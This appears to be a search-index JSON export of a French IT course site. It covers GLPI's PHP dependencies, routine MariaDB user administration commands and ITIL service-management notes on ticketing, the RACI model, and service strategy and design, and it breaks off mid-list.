la librairie GD  </li> <li>php-xml : Permet l'affichage de fichier xml  </li> <li>php-ldap : N\u00e9cessaire pour coupler glpi avec active directory  </li> <li>php-xmlrpc : Echange de proc\u00e9dure distante  </li> <li>php-imap : Pour l'utilisation de la messagerie et la cr\u00e9ation de ticket via les adresses mail  </li> <li>php-intl : Module d'internalisation pour PHP  </li> <li>php-zip : Module pour les fichiers zip  </li> <li>php-bz2 : Module pour les fichiers bz2  </li> <li>php-apcu-bc : permet l'authentification automatis\u00e9e  </li> <li>php-cas : permet l'authentification automatis\u00e9e  </li> </ul>"},{"location":"GLPI/glpi/#serveur-de-base-de-donnees","title":"Serveur de base de donn\u00e9es","text":"<p>Pour que GLPI fonctionne, celui-ci \u00e0 besoin de stocker des informations sur une base de donn\u00e9es. Pour cela il utilise un SGBD (Syst\u00e8me de Gestion de Base de Donn\u00e9es)  </p> <p></p>"},{"location":"GLPI/glpi/#fonctionnement","title":"Fonctionnement","text":"<p>Composants du serveur GLPI</p> <p></p>"},{"location":"GLPI/glpi/#installation-glpi","title":"Installation GLPI","text":"<p>l'installation compl\u00e8te :  </p> <ul> <li>Serveur web GLPI  </li> <li>Base de donn\u00e9e Mariadb  </li> <li>Client  </li> </ul> <p>est \u00e0 retrouver en cliquant ici.  </p>"},{"location":"GLPI/mariadb/","title":"Gestion MariaDB &amp; MySQL","text":"<p>Les exemples suivant utilisent :     - identifiant indique l'emplacement ou taper l'identifiant de la personne \u00e0 g\u00e9rer     - serveur correspond au serveur ou \u00e0 la base de donn\u00e9e MariaDB et MySQL accepte aussi bien :     - Les simples quotes <code>' '</code>     - Les doubles quotes <code>\" \"</code> Voila pourquoi les 2 types sont repr\u00e9sent\u00e9s dans les blocs de code ci-dessous  </p>"},{"location":"GLPI/mariadb/#entrer-dans-la-base-de-donnee","title":"Entrer dans la base de donn\u00e9e","text":"<p>Pour cela ouvrir un shell et taper :  </p> <pre><code>Mysql -u root -p\nEnter password:\nWelcome to the MariaDB monitor.  \nCommands end with ; or \\g.  \nYour MariadDB connection id is 100  \nServer version: 10.11.4-MariaDB-1~deb12u1 Debian 12  \n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  drop\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n</code></pre>"},{"location":"GLPI/mariadb/#visualiser-base-de-donnee","title":"visualiser base de donn\u00e9e","text":"<pre><code>MariaDB [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| db_glpi            |\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n5 rows in set (0,000 sec)\n\nMariaDB [(none)]&gt; exit\nBye\n</code></pre>"},{"location":"GLPI/mariadb/#utilisateur","title":"Utilisateur","text":""},{"location":"GLPI/mariadb/#visualisation","title":"Visualisation","text":"<pre><code>MariaDB [(none)]&gt; select user,host from mysql.user;\n+--------------+-----------+\n| User         | Host      |\n+--------------+-----------+\n| admindb_glpi | localhost |\n| mariadb.sys  | localhost |\n| mysql        | localhost |\n| phpmyadmin   | localhost |\n| root         | localhost |\n+--------------+-----------+\n5 rows in set (0,001 sec)\n</code></pre>"},{"location":"GLPI/mariadb/#creation","title":"Cr\u00e9ation","text":"<pre><code>MariaDB [(none)]&gt; CREATE USER 'identifiant'@'serveur';\n\nMariaDB [(none)]&gt; CREATE USER 'identifiant'@'serveur' IDENTIFIED BY 'mot_de_passe';\n</code></pre>"},{"location":"GLPI/mariadb/#changement-mot-de-passe","title":"Changement mot de passe","text":"<pre><code>MariaDB [(none)]&gt; SET PASSWORD FOR \"identifiant\"@\"serveur\" = PASSWORD(\"NouveauMotDePasse\");\nMariaDB [(none)]&gt; quit;\n</code></pre>"},{"location":"GLPI/mariadb/#renommage","title":"Renommage","text":"<p><pre><code>MariaDB [(none)]&gt; RENAME USER 'identifiant'@'serveur' TO 'nouveau_identifant'@'nouveau_serveur';\n</code></pre> Si le serveur est inchang\u00e9 il faudra quand m\u00eam retaper le nom du serveur sur lequel l'utilisateur ce trouve.  </p>"},{"location":"GLPI/mariadb/#supression","title":"Supression","text":"<pre><code>MariaDB [(none)]&gt; DROP USER 'identifiant'@'serveur'\n</code></pre>"},{"location":"GLPI/mariadb/#voir-les-droits-dun-utilisateur-sur-les-bases-de-donnees","title":"Voir les droits d'un utilisateur sur les bases de donn\u00e9es","text":"<pre><code>MariadB [(none)]&gt; show grants for \"admindb_glpi\"@\"localhost\";\n+---------------------------------------------------------------------------------------------------------------------+\n| Grants for admindb_glpi@localhost                                                                                   |\n+---------------------------------------------------------------------------------------------------------------------+\n| GRANT USAGE ON *.* TO `admindb_glpi`@`localhost` IDENTIFIED BY PASSWORD '*0F3704CF78312459ABAEBE40557BFF7BFCB0A3EC' |\n| GRANT ALL PRIVILEGES ON `db_glpi`.* TO `admindb_glpi`@`localhost`                                                   |\n| GRANT ALL PRIVILEGES ON `glpi_db`.* TO `admindb_glpi`@`localhost`                                                   |\n+---------------------------------------------------------------------------------------------------------------------+\n3 rows in set (0,000 sec)\n</code></pre>"},{"location":"ITIL/ITIL1/","title":"ITIL","text":""},{"location":"ITIL/ITIL1/#presentation-itil","title":"Pr\u00e9sentation ITIL","text":"<p>ITIL: Information Technology Infrastructure Library.  </p> <p>En fran\u00e7ais: Biblioth\u00e8que pour l'infrastructure des technologies de l'information. collection de livre qui traitre de la technologie de l'information Fait par l'OGC (Office of GovernmentCommerce) une instance du gouvernement britannique qui l'\u00e9dite et le diffuse. l'ITIL n'est pas propri\u00e9taire et est accessible a tous en \"open-source\".  </p> <ul> <li>Elles sont disponible via des logiciel edit\u00e9 par des editeur.</li> <li>L'ITIL est non prescriptif et il faut l'adapter a l'entreprise afin que celle-ci puisse l'adopter et la mettre en oeuvre.  </li> </ul> <p>ITIL d\u00e9finit les bonnes pratiques informatiques afin d'avoir un syst\u00e8me d'information le plus efficace et le plus efficient possible.  </p> <p>ISO 9001: Norme qui s'adresse \u00e0 tous les secteurs d'activit\u00e9, qui d\u00e9finit un syst\u00e8me de gestion de qualit\u00e9 par le processus.  </p> <p>ISO 20000: Norme internationale, sp\u00e9cifique \u00e0 la gestion des syst\u00e8mes d'information, d\u00e9finie en treize processus (ces processus sont d\u00e9finis dans ITIL). Cette certification est facilit\u00e9e si l'on poss\u00e8de ISO 9001 et ITIL v2 minimum.  </p>"},{"location":"ITIL/ITIL1/#differences-entre-normes-standards-et-bonne-pratique","title":"Diff\u00e9rences entre normes, standards et bonne pratique","text":"NormesStandardsBonne pratique <ul> <li>Definissent des exigences des sp\u00e9cfifications, des lignes directrices \u00e0    appliquer, elles ont un caractere obligatoire aboutissant a des certifications.  </li> <li>Elles garantissent d'un produit d'un certain niveau de qualit\u00e9.  </li> <li>Elles sont elabor\u00e9 par des org en FR aFAC internatio ISO (Inter Standr Organisation)</li> </ul> <ul> <li>Document elabor\u00e9s par une entreprise ou un groupe d'entreprises qui pr\u00e9conisent des exigences, des sp\u00e9cifications, des lignes directrices \u00e0 appliquer.  </li> <li>Elles garantissent un niveau d'utilisation, elles n'apportent pas de niveau de qualit\u00e9 ni de certification.</li> </ul> <p>Il s'agit d'experience et de pragmatisme, de v\u00e9cu. </p> <p>Def. Recueil de pr\u00e9conisations, montrant leurs b\u00e9n\u00e9fice, issues du monde des entreprises (grande comme petite) et qui ont montr\u00e9 leurs b\u00e9n\u00e9fices dans des environnements diff\u00e9rents (banque, Telecom etc.), elles sont g\u00e9n\u00e9ralement recueilli par des associations qui federe et valide ces bonnes pratiques. L'interet d'avoir des bonnes pratiques c'est souvent, en permanence, de pouvoir se comparer aux autres. une entreprise utilisatn les bonnes pratiques ITIL pourra s'evaluer sur sa gestion des incidents. Les bonnes pratique permettent d'avoir ses references par rapport a d'autre entreprise.</p>"},{"location":"ITIL/ITIL1/#historique","title":"Historique","text":"<p>L'historique ITIL:  </p> <p>Historique ITIL</p> 198819912003200420072011Janvier 2020 <p>CCTA (Central Computer Telecommunication Agency), agence  gouvernemental anglaise, cr\u00e9e les premieres bases de l'ITIL pour l'administration anglaise au travers d'une collecte de bonnes pratiques.  </p> <p>Premiers groupes de travail (ITSMF = Information technology service management forum) reunissant des professionnels de l'informatique. Celle-ci a un essor important en grande-bretagne - ITIL devient un standard au Pays-Bas ITSMF association des utilisateurs ITIL cr\u00e9\u00e9e en 1991, accro\u00eet le nombre de chapitres : EU, CANADA, JAPON, AUSTRALIE...(plus de 50 au total)  </p> <p>La cr\u00e9ation de l'ITSMF France pour promouvoir la d\u00e9marche ITIL  </p> <p>Evolution vers ITIL v2 qui repose sur 9 livres centraux Apparition de processus orient\u00e9s s\u00e9curit\u00e9 et des SLA Le syst\u00e8me d'information est un fournisseur de services  </p> <p>Parution de la version V3 Ajout de la notion de \"cycle de vie des services\"</p> <p>Parution de la version V3 amend\u00e9e  </p> <p>ITIL 4 n'est pas une version, mais un d\u00e9poussi\u00e9rage de la version 3 en gardant les principes fondamentaux.  </p> <p>R\u00e9ferentiel international de gestion des services informatiques  </p>"},{"location":"ITIL/ITIL1/#presentation-itil-v3","title":"Pr\u00e9sentation ITIL v3","text":"<p>ITIL repose sur l'\u00e9volution de l'informatique dans une gestion de projets vers une gestion de service Contenu:  </p> <ul> <li>Les bonnes pratiques de la gestion des services informatiques  </li> <li>D\u00e9finition d'un langage commun  </li> <li>D\u00e9finition d'un cadre de travail  </li> </ul> <p>Les diff\u00e9rents acteurs :  </p> <ul> <li>OGC (Office of Government Commerce): Office public britannique du commerce.  </li> <li>Propri\u00e9taire du r\u00e9f\u00e9rentiel - initialise et contr\u00f4le les publications.  </li> <li>Axelos Entreprise cr\u00e9\u00e9e en 2014 par l'OGC pour g\u00e9rer ITIL  </li> <li>Organismes de gestion des certifications et des examens  <ul> <li>APM Group, EXIN, ISEB, Loyalist College, Dansk IT, DF Certifiering  </li> <li>D\u00e9finissent un langage commun  </li> </ul> </li> <li>ITSMF (IT Service Management Forum)</li> <li>Association d'utilisateurs</li> <li>Les organismes de formation et les formateurs agr\u00e9es</li> <li>Les experts et les consultants en gestion de service certifi\u00e9s ITIL  </li> </ul> Apport ITIL 4 <p>ITIL 4 n'est pas une nouvelle version, mais repr\u00e9sente la 4e g\u00e9n\u00e9ration industrielle. Nouveaut\u00e9s: - Gestion de projet Agile - Le lean - Le cloud</p>"},{"location":"ITIL/ITIL10/","title":"Assistance avec GLPI","text":"<p>Objectifs </p> <ul> <li>D\u00e9couvrir la cr\u00e9ation d'un ticket</li> <li>D\u00e9couvrir le traitement d'un ticket</li> <li>Appr\u00e9hender la base de connaissance</li> </ul>"},{"location":"ITIL/ITIL10/#le-ticket","title":"Le ticket","text":"<p>En informatique, tout fonctionne \u00e0 base de ticket Cela permet de solliciter la DSI Un ticket passera par plusieurs status : cycle de vie du ticket Peut-\u00eatre de 2 types : - Incident - Demande Doit compter un minimum d'information Offre de nombreux avantages: - Tra\u00e7abilit\u00e9 - D\u00e9tection des probl\u00e8mes - R\u00e9partition des t\u00e2ches - Communication</p>"},{"location":"ITIL/ITIL10/#lassistance-sous-glpi","title":"L'assistance sous GLPI","text":"<p>Syst\u00e8me de gestion de tickets / outil de ticketing Conforme aux bonnes pratques ITIL Recueil des sollicitations utilisateur pour une gestion centralis\u00e9e Diff\u00e9rents canaux de communication possibles Saisie, suivi et traitement du ticket Cycle de vie des tickets Statistiques possibles  </p>"},{"location":"ITIL/ITIL10/#flux-dentree","title":"Flux d'entr\u00e9e","text":"<p>Trois grandes fa\u00e7ons de cr\u00e9er un ticket </p> <p></p>"},{"location":"ITIL/ITIL10/#cycle-de-vie-dun-ticket","title":"Cycle de vie d'un ticket","text":""},{"location":"ITIL/ITIL10/#traitement-dun-ticket","title":"Traitement d'un ticket","text":""},{"location":"ITIL/ITIL10/#apercu","title":"Aper\u00e7u","text":""},{"location":"ITIL/ITIL10/#attribution","title":"Attribution","text":"<p>Utilisateurs, groupes ou fournisseurs Repr\u00e9sente les techniciens ou groupes de comp\u00e9tences en charge du ticket Utilis\u00e9 lors des escalades fonctionnelles Raccourci pour s'attribuer nominativement le ticket Peut-\u00eatre automatis\u00e9 en fonction de crit\u00e8res \u00e0 la cr\u00e9ation du ticket Ticket visible pour traitement par les groupes et utilisateurs attribu\u00e9s  </p> <p></p>"},{"location":"ITIL/ITIL10/#observateurs","title":"Observateurs","text":"<p>Utilis\u00e9 lors des escalades hi\u00e9rarchiques Utilisateurs et groupes Notifications sans traitement possible du ticket Va permettre de suivre l'\u00e9volution du ticket Peuvent \u00eatre ajout\u00e9s automatiquement \u00e0 la cr\u00e9ation en fonction de crit\u00e8res  </p> <p></p>"},{"location":"ITIL/ITIL10/#sla","title":"SLA","text":"<p>Doivent \u00eatre facilement identifiables Le type : Temps de r\u00e9solution La dur\u00e9e maximum de r\u00e9solution souhait\u00e9e Possibilit\u00e9 de cr\u00e9er des niveaux d'escalade  </p> <p></p>"},{"location":"ITIL/ITIL10/#validation","title":"Validation","text":"<p>Les valideurs re\u00e7oivent une notification de validation Ils approuvent ou refusent en acc\u00e9dant au ticket \u00e0 valider.  </p> <p></p> <p></p>"},{"location":"ITIL/ITIL10/#traitement","title":"Traitement","text":"<p>Onglet Traitement du ticket 4 possibilit\u00e9s : - Suivi - T\u00e2che - Solution - Document</p> <p></p>"},{"location":"ITIL/ITIL10/#cloture","title":"Cl\u00f4ture","text":"<p>La cl\u00f4ture du ticket s'effectue \u00e0 l'approbation de la solution Peut-\u00eatre effectu\u00e9e par le demandeur ou le r\u00e9dacteur (ticket par t\u00e9l\u00e9phone) Accessible par le mail de validation ou le menu ticket de l'interface simplifi\u00e9e Commentaire obligatoire en cas de refus Possibilit\u00e9 de planifier ou rendre la cl\u00f4ture imm\u00e9diate \u00e0 la r\u00e9solution  </p> <p></p>"},{"location":"ITIL/ITIL10/#ticket-elements-lies","title":"Ticket : El\u00e9ments li\u00e9s","text":"<p>Liaison de CI possible \u00e0 la cr\u00e9ation d'un ticket Utile pour le diagnostic Utile pour les statistiques N\u00e9cessite une CMDB \u00e0 jour et bien renseign\u00e9e  </p> <p></p>"},{"location":"ITIL/ITIL10/#base-de-connaissance","title":"Base de connaissance","text":""},{"location":"ITIL/ITIL10/#article","title":"Article","text":"<p>Objectifs:  </p> <ul> <li>Centraliser des connaissances internes aux diff\u00e9rents techniciens</li> <li>Mettre \u00e0 disposition des utilisateurs des informations (FAQ)</li> </ul> <p>Accessible depuis Outils =&gt; Base de connaissances Restriction \u00e0 un nombre d'acteurs Validation de publications d'articles Gestion des r\u00e9visions Liaison possibles avec les tickets et les \u00e9l\u00e9ments d'inventaire (CI) FAQ: sous-partie de la base de connaissances \u00e0 destination des utilisateurs Organisation possible par cat\u00e9gories et restrictions temporelles  </p>"},{"location":"ITIL/ITIL10/#creation","title":"Cr\u00e9ation","text":"<p>Cr\u00e9ation d'un article Ajout des cibles Usage public ou non  </p> <p>Article sans cible = Article non publi\u00e9 Appara\u00eet dans G\u00e9rer Visible que par son cr\u00e9ateur  </p> <p></p>"},{"location":"ITIL/ITIL10/#cibles","title":"Cibles","text":"<p>Vont permettre de publier l'article \u00e0 diff\u00e9rents personnes Entit\u00e9 - Profil - Groupe - Utilisateur  </p> <p></p>"},{"location":"ITIL/ITIL10/#base-de-connaissances-publiques","title":"Base de connaissances publiques","text":"<p>Eviter la cr\u00e9ation syst\u00e9matique d'un ticket FAQ (Foire Aux Questions) Accessible depuis l'interface simplifi\u00e9e Acc\u00e8s rapide ou par cat\u00e9gories  </p> <p></p>"},{"location":"ITIL/ITIL2/","title":"La gestion des services","text":""},{"location":"ITIL/ITIL2/#presentation-ditil","title":"Pr\u00e9sentation d'ITIL","text":"<p>ITIL v3 propose une \u00e9volution de la gestion de projet vers la gestion de service qui est plus orient\u00e9e client Un projet C'est la capacit\u00e9 \u00e0 impl\u00e9menter de nouvelles fonctionnalit\u00e9s par rapport \u00e0:  </p> <ul> <li>De nouveaux besoins  </li> <li>Une nouvelle l\u00e9gislation  </li> <li>Une avanc\u00e9e technologie  </li> </ul> <p>Un service </p> <p>un service doit fournir de la valeur</p> <p>C'est la capacit\u00e9 \u00e0 produire le service demand\u00e9 en respectant trois crit\u00e8res importants:  </p> <ul> <li>Aligner les services informatiques sur les besoins des clients  </li> <li>Am\u00e9liorer la qualit\u00e9 des services informatiques  </li> <li>Ma\u00eetriser les co\u00fbts de fourniture  </li> </ul>"},{"location":"ITIL/ITIL2/#definitions-dun-service","title":"D\u00e9finitions d'un service","text":"<p>Un service est l'ensemble des moyens mis en oeuvre pour apporter \u00e0 un client de la valeur sans qu'il n'en supporte ni les co\u00fbts ni les risques En r\u00e9sum\u00e9 c'est un engagement de r\u00e9sultat l'informatique s'engage sur un r\u00e9sultat par rapport a une certaine fonctionnalit\u00e9 et un niveau de qualit\u00e9.  </p> <p>Un service est, par exemple, une applications install\u00e9e sur une infrastructure avec:  </p> <ul> <li>Une documentation associ\u00e9e  </li> <li>Une formation adapt\u00e9e  </li> <li>Un support mis en place  </li> <li>De l'assistance aux utilisateurs  </li> </ul> <p>Un service est l'engagement sur le r\u00e9sultat:  </p> <ul> <li>Face au client  </li> <li>Face au risque  </li> <li>En assumant les risques  </li> </ul>"},{"location":"ITIL/ITIL2/#les-2-conditions-requises-pour-creer-de-la-valeur","title":"Les 2 conditions requises pour cr\u00e9er de la valeur","text":"<p>Utilit\u00e9 (dimension de la prestation) La raison d'\u00eatre d'un service  </p> <ul> <li>Am\u00e9lioration des performances  </li> <li>D\u00e9passement des contraintes  </li> <li>Ou les deux  </li> </ul> <p>Garantie (utilisabilit\u00e9) La garantie est l'assurance, pour le client, que le service va remplir les exigences de niveau de qualit\u00e9 contractualis\u00e9 (condition, r\u00e9sultats, lieu, d\u00e9lais et moment) C'est le niveau d'usage dont le client et ses utilisateurs ont besoin. Elle doit respecter:</p> <ul> <li>Les heures d'ouverture  </li> <li>La disponibilit\u00e9  </li> <li>La performance  </li> <li>La continuit\u00e9 de service  </li> <li>La s\u00e9curit\u00e9  </li> </ul> <p></p>"},{"location":"ITIL/ITIL2/#les-5-acteurs-de-services","title":"Les 5 acteurs de services","text":"<ol> <li> <p>Le fournisseur de services informatiques (IT Service Provider) Entit\u00e9 responsable de la mise \u00e0 disposition des services informatiques  </p> <ul> <li>Type 1: Fournisseurs interne  <ul> <li>Par exemple, l'organisation marketing d'une entreprise d\u00e9cide de mettre en place chez elle une \u00e9quipe informatique charg\u00e9e de g\u00e9rer l'informatique qu'elle utilise.  </li> </ul> </li> <li>Type 2: Fournisseur de service partag\u00e9s  <ul> <li>C'est le cas d'une direction informatique ayant pour clients les diff\u00e9rentes organisations de l'entreprise (y compris elle-m\u00eame).  </li> </ul> </li> <li>Type 3: Fournisseur externe  <ul> <li>Ce type de fournisseur propose ses services \u00e0 toutes les entreprises int\u00e9ress\u00e9es.  </li> </ul> </li> </ul> </li> <li> <p>Le client     Personne ou organisation b\u00e9n\u00e9ficiaire finale d'un service, comptable des r\u00e9sultats.  </p> <ul> <li>Il est le donneur d'ordre</li> <li>Il est autoris\u00e9 \u00e0 signer un contrat (SLA) portant sur la fourniture de service informatique</li> <li>Il va exprimer les besoins m\u00e9tiers<ul> <li>N\u00e9gocier le service</li> <li>Valider la solution</li> <li>Payer la solution et le service</li> </ul> </li> <li>Il est le repr\u00e9sentant des utilisateurs</li> <li>Il a une relation particuli\u00e8re avec la DSI</li> </ul> </li> <li> <p>L'utilisateur (collaborateur du client)     Personne qui utilise un syst\u00e8me informatique  </p> <ul> <li>Elle utilise les services informatiques au quotidien pour son activit\u00e9 professionnelle</li> <li>Il remonte ses exigences aupr\u00e8s du client</li> <li>Il ne paye pas l'utilisation d'un service</li> <li>Il contacte la DSI par l'interm\u00e9diaire du centre de services (helpdesk)</li> </ul> </li> <li> <p>Propri\u00e9taire de service (Service Owner - marketing)     Entit\u00e9 responsable qui effectue le suivi du service informatique  </p> <ul> <li>Il est responsable de la d\u00e9finition du service et de sa mise en oeuvre</li> <li>Il participe aux propositions d'am\u00e9lioration du service</li> <li>Il est responsable de la bonne mise en oeuvre des am\u00e9liorations valid\u00e9es</li> <li>Il repr\u00e9sent\u00e9 le service aupr\u00e8s des clients</li> <li>Il participe \u00e0 la n\u00e9gociation des SLA (Service Level Agreement) et des OLA (Operationnal Level Agreement: Accords sur les niveaux op\u00e9rationnels)</li> <li>Il est un des destinataires pour les incidents majeurs lors des escalades</li> <li>Il est responsable de la vie du service (\u00e9volution et fin du service, cr\u00e9ation de tableaux de bord)</li> <li>Il s'assure que le service atteigne les objectifs</li> </ul> </li> <li> <p>Le gestionnaire de service     Personne responsable de la mise en place de la d\u00e9marche ITIL au sein de l'entreprise et de la vie du service.  </p> <ul> <li>Il poss\u00e8de une position hi\u00e9rarchique \u00e9l\u00e9v\u00e9e pour \u00eatre l\u00e9gitime</li> <li>Il coordonne les activit\u00e9s des propri\u00e9taires de processus et des propri\u00e9taires de services</li> <li>Il travaille en collaboration avec le gestionnaire de l'am\u00e9lioration continue des services</li> </ul> </li> </ol>"},{"location":"ITIL/ITIL2/#les-2-dispositions-specialisees-au-coeur-ditil","title":"Les 2 dispositions sp\u00e9cialis\u00e9es au coeur d'ITIL","text":"<p>La gestion de service int\u00e8gre:  </p> <ul> <li>La planification</li> <li>La mise en oeuvre</li> <li>L'optimisation de la fourniture des services</li> <li>Le support des services</li> </ul> <p>Pour cela, il y a 2 dispositions sp\u00e9cialis\u00e9es:</p> <ul> <li>Des fonctions</li> <li>Des processus</li> </ul>"},{"location":"ITIL/ITIL2/#la-notion-de-processus","title":"La notion de processus","text":"<p>Un processus est une suite d'activit\u00e9s structur\u00e9es et logiques poursuivant un objectif d\u00e9fini Il poss\u00e8de plusieurs caract\u00e9ristiques:  </p> <ul> <li>Il comprend un ou des \u00e9l\u00e9ments en entr\u00e9e d\u00e9finis</li> <li>Il comprend un ou des \u00e9l\u00e9ments en sortie qui peuvent \u00eatre en entr\u00e9e d'un autre processus</li> <li>Il est mesurable: co\u00fbts, qualit\u00e9, gain de productivit\u00e9 et d\u00e9lais de production</li> <li>Il a un ou des r\u00e9sultats attendus</li> <li>Il a un ou des clients</li> <li>Il a un ou des d\u00e9clencheurs</li> <li>Il d\u00e9finit les r\u00f4les et les responsabilit\u00e9s des diff\u00e9rents acteurs</li> <li>Il d\u00e9finit les besoins en outils et les contr\u00f4les de gestion</li> <li>Il doit \u00eatre document\u00e9</li> <li>Il doit \u00eatre control\u00e9</li> </ul>"},{"location":"ITIL/ITIL2/#modelisation-dun-processus","title":"Mod\u00e9lisation d'un processus","text":""},{"location":"ITIL/ITIL2/#les-mesures-dun-processus","title":"Les mesures d'un processus","text":"<p>Les mesures d'un processus (ses r\u00e9sultats, ses activit\u00e9s, ses livrables...) permettent d'am\u00e9liorer son efficacit\u00e9 et son efficience  </p> <p>L'efficacit\u00e9: </p> <ul> <li>C'est une mesure permettant de savoir si les objectifs d'un processus, d'un service    ou d'une activit\u00e9 ont \u00e9t\u00e9 atteints  </li> </ul> <p>L'efficience: </p> <ul> <li>C'est une mesure qui permet de savoir si la quantit\u00e9 de ressources attribu\u00e9e \u00e0 un processus, \u00e0 un service ou \u00e0 une activit\u00e9 a \u00e9t\u00e9 suffisante et bien utilis\u00e9e (co\u00fbt d'argent, d'hommes, de temps)  </li> </ul>"},{"location":"ITIL/ITIL2/#la-notion-de-fonction","title":"La notion de fonction","text":"<p>Une fonction est un groupe de personnes fonctionnelles (unit\u00e9, \u00e9quipe) disposant d'outils et de ressources sp\u00e9cifiques pour ex\u00e9cuter un certain type de travaux et sera responsable des r\u00e9sultats sp\u00e9cifiques Il assure une ou plusieurs activit\u00e9s par rapport \u00e0 un ou plusieurs processus Il est responsable des outils (d\u00e9finition et utilisation) ITIL d\u00e9finit quatre fonctions:  </p> <ul> <li>Le centre des services  </li> <li>La gestion des op\u00e9rations  </li> <li>La gestion technique  </li> <li>La gestion des applications  </li> </ul>"},{"location":"ITIL/ITIL2/#fonctions-et-processus","title":"Fonctions et processus","text":""},{"location":"ITIL/ITIL2/#la-notion-de-role","title":"La notion de R\u00f4le","text":"<p>Un r\u00f4le se d\u00e9finit \u00e0 un instant T (qui fait quoi \u00e0 ce moment-l\u00e0) Il s'agit de l'ensemble de responsabilit\u00e9, que l'on attribue a une personne ou a un groupe de personne, un role va permettre d'attribuer la responsabilite d'une action d'un processus ou d'attribuer la responsabilit\u00e9 d'une fonction a une person ou a une equipe.  </p>"},{"location":"ITIL/ITIL2/#modele-raci","title":"Mod\u00e8le R.A.C.I","text":"<p>Dans la demarche ITIL les roles sont strucur\u00e9 via la modele RACI (Responsible Accountable Consulted Informed)  </p> <p>R.A.C.I</p> R - ResponsibleA - AccountableC - ConsultedI - Informed <p>R\u00e9alise et reporte - charg\u00e9 de faire - En charge de la r\u00e9alisation de l'action (plusieurs) - Sous-traitant de A - Au moins 1 par action  </p> <p>Autorise et assume - responsable - Rend des comptes sur l'avancement de l'action - Assume la responsabilit\u00e9 de l'action - 1 seul par action</p> <p>Personne Consult\u00e9 - Impliqu\u00e9 dans l'action en tant que fournisseur d'avis - L'avis doit \u00eatre pris en compte par la personne qui l'a demand\u00e9 - Au moions 1 par action</p> <p>Personne qui est inform\u00e9 - Doit prendre connaissance de l'action et de son avancement - Doit \u00eatre inform\u00e9 sur le d\u00e9roulement, le r\u00e9sultat - Au moins 1 par action</p> <p></p>"},{"location":"ITIL/ITIL2/#le-cycle-de-vie-des-services","title":"Le cycle de vie des services","text":""},{"location":"ITIL/ITIL3/","title":"Livre 1 - Strat\u00e9gie des services","text":""},{"location":"ITIL/ITIL3/#objectifs","title":"Objectifs","text":"<ul> <li>Comment d\u00e9velopper l'offre de service dans un contexte concurrentiel ?  </li> <li>Comment passer de la gestion des services \u00e0 un r\u00f4le strat\u00e9gique de la DSI pour l'entreprise ?  </li> <li>Comment apporter de la valeur aux clients ?  </li> </ul>"},{"location":"ITIL/ITIL3/#son-role","title":"Son r\u00f4le","text":"<ul> <li>Produire des services de qualit\u00e9 apportant de la valeur aux clients en pr\u00e9voyant les conflits possibles  </li> <li>Planifier et d\u00e9finir une strat\u00e9gie des services (services offerts)  </li> <li>Rester proche des demandes m\u00e9tiers en restant concurrentiel  </li> </ul>"},{"location":"ITIL/ITIL3/#la-gestion-de-la-strategie","title":"La gestion de la strat\u00e9gie","text":"<ul> <li>Il permet l'\u00e9tablissement de la strat\u00e9gie des services en fonction de l'\u00e9tat du march\u00e9, des demandes (clients), des offres (concurrence) et des capacit\u00e9s de l'entreprise (personnel, mat\u00e9riel, financi\u00e8re).  </li> </ul>"},{"location":"ITIL/ITIL3/#la-gestion-du-portefeuille-des-services","title":"La gestion du portefeuille des services","text":"<ul> <li>Il liste tous les services (futurs, actuels, retir\u00e9s) et leur description (co\u00fbt)  </li> <li>Les services actuels sont contenus dans le catalogue des services (clients)  </li> </ul>"},{"location":"ITIL/ITIL3/#la-gestion-des-demandes","title":"La gestion des demandes","text":"<ul> <li>C'est un processus les plus critiques  </li> <li>Permet d'analyser les besoins des clients, actuels et surtout futurs, en fonction des \u00e9volutions des m\u00e9tiers et des technologies.  </li> </ul>"},{"location":"ITIL/ITIL3/#la-gestion-financiere","title":"La gestion financi\u00e8re","text":"<ul> <li>Permet d'analyser les co\u00fbts d'un service afin d'en d\u00e9finir le prix  </li> </ul>"},{"location":"ITIL/ITIL3/#la-gestion-de-la-relation-metier","title":"La gestion de la relation m\u00e9tier","text":"<ul> <li>Maintient une relation de confiance avec les clients pour garantir la satisfaction g\u00e9n\u00e9rale ressentie  </li> </ul>"},{"location":"ITIL/ITIL3/#les-4-p","title":"Les 4 \"P\"","text":""},{"location":"ITIL/ITIL3/#terminologie","title":"Terminologie","text":"<p>ROI (Return On investment): Retour sur investissement: Comparaison de la d\u00e9pense par rapport \u00e0 la valeur produite et sur quelle dur\u00e9e  </p> <p>TCO (Total Cost of Ownership): co\u00fbt total de possession: Ensemble des co\u00fbts de fourniture des services  </p> <p>Co\u00fbt d'un service: Argent d\u00e9pens\u00e9 pour concevoir ou fournir un service  </p> <ul> <li>Co\u00fbts directs: achat de mat\u00e9riels ou de fournitures (facture)  </li> <li>Co\u00fbts indirects: frais par rapport \u00e0 l'entreprise (location des locaux)  </li> <li>Co\u00fbts cach\u00e9s (inclus dans le TCO): manque de formation des techniciens  </li> </ul> <p>Prix d'un service: le cout augment\u00e9 d'une marge  </p>"},{"location":"ITIL/ITIL4/","title":"Livre 2 - Conception des services","text":""},{"location":"ITIL/ITIL4/#objectif","title":"Objectif","text":"<ul> <li>Produire des services en respectant les livrables produits par la strat\u00e9gie des services.  </li> </ul>"},{"location":"ITIL/ITIL4/#son-role","title":"Son r\u00f4le","text":"<ul> <li>Recueillir les exigences du client (SLR = Service Level Requirement : Exigences de niveaux de service)  </li> <li>D\u00e9finir la solution  </li> <li>Connaitre les contraintes de l'architecture du syst\u00e8me d'information  </li> <li>D\u00e9finir les processus  </li> <li>D\u00e9finir les indicateurs de mesure du service  </li> </ul>"},{"location":"ITIL/ITIL4/#definir-la-solution","title":"D\u00e9finir la solution","text":"<p>Exigences, contraintes, sp\u00e9cifications, validit\u00e9 et b\u00e9n\u00e9fices: ou je dois aller ? Options de r\u00e9alisation : comment vais-je m'y prendre ?  </p> <ul> <li>R\u00e9alisation interne ou sous-traitance ?  </li> <li>Maintenance corrective internet ou externe (TMA) ?  </li> <li>Exploitation interne ou infog\u00e9rance ?  </li> <li>Sous-traitance fonctionnelle (BPO) ?  </li> <li>ASP: fournir le service directement au client final via l'infrastructure de l'informatique d'un fournisseur ?  </li> <li>KPO: appel \u00e0 un ou plusieurs consultants externes pour leurs connaissances sur les m\u00e9tiers ou la technologie ?  </li> 